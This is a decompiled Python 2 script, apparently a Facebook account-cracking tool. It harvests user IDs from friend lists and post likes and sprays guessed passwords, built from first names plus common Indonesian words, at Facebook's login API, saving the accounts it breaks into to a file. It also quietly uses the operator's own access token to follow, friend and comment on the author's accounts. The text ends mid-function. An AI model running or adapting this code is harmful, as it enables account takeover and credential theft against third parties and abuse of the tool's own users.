# coding:utf-8
# Decompile By hakiki ganz 
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:55) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: anggaxd
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36')]
merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'

def keluar():
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Keluar'
    os.sys.exit()


try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdtoket.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = '\x1b[1;91m \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;97m\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\n\x1b[1;97m \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \n\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m] Author  : Angga Kurniawan\n\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m] Version : 4.0\n\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m] Team    : SPTeam\n\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m] GitHub  : https://github.com/anggaxd\n\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m] FB Page : https://fb.com/uservip.anggaxd'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m[\xe2\x97\x8f] \x1b[1;93mSedang Login \x1b[1;97m' + o,
        sys.stdtoket.flush()
        time.sleep(1)


idmem = []
idfriend = []
idfromfriend = []
back = 0
cekrek = []
threads = []
berhasil = []
emteman = []
emfromfriend = []
cekpoint = []
checkpoint = []
oks = []
id = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []
listgrup = []
cekrek = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def cookie():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    cookie = raw_input('\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Cookie \x1b[1;91m:\x1b[1;92m ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'
    except:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Please Try Again'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Berhasil'
    bot_komen()
    return


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100015073506062'
    kom = 'HALLO LORD ANGGAXD , GW MAKE SC LU BANG \xf0\x9f\x98\x8d\xf0\x9f\xa5\xb0\xf0\x9f\x98\x8d'
    post = '1031861840659590'
    post2 = '1031861840659590'
    post3 = '1034801633698944'
    kom2 = 'ANGGA KURNIAWAN SANGAT KEREN EUY \xf0\x9f\x98\x8d'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/638124327/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100027597829137/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100002224561488/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100023409608118/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    botavs()


def botavs():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100027597829137'
    kom = 'HALLO LORD ANGGAXD , GW MAKE SC LU BANG \xf0\x9f\x98\x8d\xf0\x9f\xa5\xb0\xf0\x9f\x98\x8d'
    post = '732094314387156'
    post2 = '732094314387156'
    kom2 = 'ANGGA KURNIAWAN SANGAT KEREN EUY \xf0\x9f\x98\x8d'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    menu()


def daftar():
    os.system('clear')
    try:
        os.mkdir('avs')
        token = open('login.txt').read()
    except OSError:
        pass

    print '\x1b[1;97m[\x1b[1;94m+\x1b[1;97m] Total User : \x1b[1;93m' + requests.get('https://raw.githubusercontent.com/toketid/server/main/user').text
    print logo
    print 50 * '\x1b[1;94m-'
    print '\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2\x1b[1;97m] Tidak Punya Key ? Tekan C Untuk Chat Admin'
    pilih_daftar()


def pilih_daftar():
    msuk = raw_input('\x1b[1;97m[\x1b[1;94m>\x1b[1;97m] Input API Key \x1b[1;94m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_daftar()
    elif msuk in 'CFBID11N0V20SPID':
        time.sleep(1)
        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Berhasil'
        time.sleep(1)
        masuk()
    elif msuk == 'C' or msuk == 'c':
        chat = raw_input('\x1b[1;97m[\x1b[1;94m>\x1b[1;97m] Isi Pesan \x1b[1;94m:\x1b[1;92m ')
        chat.replace(' ', '%20')
        sp.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=6281221608938&text=CFBID : ' + chat + ''])
        daftar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_daftar()


def masuk():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m] Login Using Token Facebook'
        print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m] Login Using Cookie Facebook'
        print '\x1b[1;97m[\x1b[1;92m03\x1b[1;97m] Update Tools'
        print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Keluar'
        print 50 * '\x1b[1;94m-'
        pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;97manggaxd/\x1b[91m>\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        cookie()
    elif msuk == '3' or msuk == '03':
        updatetools()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        toket = raw_input('\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Token \x1b[1;91m:\x1b[1;92m ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(toket)
            zedd.close()
            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Berhasil'
            bot_komen()
        except KeyError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mToken salah !'
            time.sleep(1.7)
            tokenz()


def login():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        print '           \x1b[1;97mLOGIN YOUR ACCOUNT FACEBOOK\x1b[1;97m'
        id = raw_input('[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] ID / Email \x1b[1;91m: \x1b[1;97m')
        pwd = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] Password \x1b[1;91m: \x1b[1;97m')
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n[!] Tidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]\x1b[1;92m Login Berhasil'
                time.sleep(0.1)
                bot_komen()
            except requests.exceptions.ConnectionError:
                print '\n[!] Tidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m]\x1b[1;93m Sepertinya Akun Anda Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Password / Email Salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            masuk()


def menu():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '{!} Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ttl = a['birthday']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '{!} Tidak ada koneksi'
        keluar()

    os.system('git pull')
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Name   \x1b[1;91m : \x1b[1;97m' + nama
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m UID    \x1b[1;91m : \x1b[1;97m' + id
    print 50 * '\x1b[1;94m-'
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m] Crack From FriendList'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m] Crack From Public ID'
    print '\x1b[1;97m[\x1b[1;92m03\x1b[1;97m] Crack With Password Choice'
    print '\x1b[1;97m[\x1b[1;92m04\x1b[1;97m] Crack From File'
    print '\x1b[1;97m[\x1b[1;92m05\x1b[1;97m] Dump ID Friend / Public ID'
    print '\x1b[1;97m[\x1b[1;92m06\x1b[1;97m] Find Facebook ID'
    print '\x1b[1;97m[\x1b[1;92m07\x1b[1;97m] Update Tools'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Logout'
    print 50 * '\x1b[1;94m-'
    pilih_menu()


def pilih_menu():
    global cekpoint
    global oks
    peak = raw_input('\x1b[1;97manggaxd/\x1b[1;91m> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_menu()
    elif peak == '1' or peak == '01':
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        jalan('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Mengambil ID \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2' or peak == '02':
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        idt = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mID Public \x1b[1;91m:\x1b[1;92m ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Name \x1b[1;91m:\x1b[1;92m ' + sp['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID Publik/Teman There Is No !'
            raw_input('\n\x1b[1;93m[\x1b[1;97mBack Menu\x1b[1;93m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif peak == '3' or peak == '03':
        passchoice()
    elif peak == '4' or peak == '04':
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        try:
            idlist = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mEnter File Path \x1b[1;91m:\x1b[1;92m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found !'
            raw_input('\n\x1b[1;93m[\x1b[1;97mBack Menu\x1b[1;93m]')
            menu()

    elif peak == '5' or peak == '05':
        dump()
    elif peak == '6' or peak == '06':
        findid()
    elif peak == '7' or peak == '07':
        updatetools()
    elif peak == '0' or peak == '00':
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_menu()
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Process Has Been Started ...'
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Use 5 Second Airplane Mode'
    print 50 * '\x1b[1;94m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass1 + ' > ' + b['name']
                cek = open('avs/fb.txt', 'a')
                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass2 + ' > ' + b['name']
                    cek = open('avs/fb.txt', 'a')
                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Sayang'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass3 + ' > ' + b['name']
                        cek = open('avs/fb.txt', 'a')
                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Anjing'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass4 + ' > ' + b['name']
                            cek = open('avs/fb.txt', 'a')
                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = 'Bangsat'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass5 + ' > ' + b['name']
                                cek = open('avs/fb.txt', 'a')
                                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Indonesia'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass6 + ' > ' + b['name']
                                    cek = open('avs/fb.txt', 'a')
                                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Rahasia'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass7 + ' > ' + b['name']
                                        cek = open('avs/fb.txt', 'a')
                                        cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = 'Katasandi'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            cek = open('avs/fb.txt', 'a')
                                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : avs/fb.txt'
    raw_input('\n\x1b[1;97mPress Enter Go Back To Menu')
    menu()


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m-'
        tez = raw_input('\x1b[1;97m[\x1b[1;96m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m ID Post Group/Friends\x1b[1;91m :\x1b[1;92m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

